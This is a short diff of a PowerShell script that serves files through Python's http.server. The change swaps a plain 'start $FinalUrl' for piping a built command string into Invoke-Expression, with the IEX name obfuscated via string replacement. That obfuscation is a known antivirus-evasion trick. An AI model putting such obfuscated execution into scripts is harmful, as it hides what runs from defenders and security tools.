@@ -547,8 +547,8 @@ If($Exec.IsPresent)
    $mytable.Columns.Add("Execute http.server")|Out-Null
 
    ## Add values to table
-   $ToExecut = "$systemcall $FinalUrl"
-   $mytable.Rows.Add("$ToExecut")|Out-Null
+   $ToExecutE = "$systemcall $FinalUrl"
+   $mytable.Rows.Add("$ToExecutE")|Out-Null
 
    ## Display Data Table
    $mytable | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1 | ForEach-Object {
@@ -585,7 +585,7 @@ If($Exec.IsPresent)
    Start-Process powershell.exe -argumentlist "Get-content banner.mp;write-host '[ Press CTRL+C to exit python http.server ]' -foregroundcolor red;$interpreter -m http.server $Port --bind $IP"
    Start-Sleep -Milliseconds 2300
 
-   start $FinalUrl
+   $ToExecutE|&('rEX' -replace 'r','I')
 }
 
 If($Logfile.IsPresent)
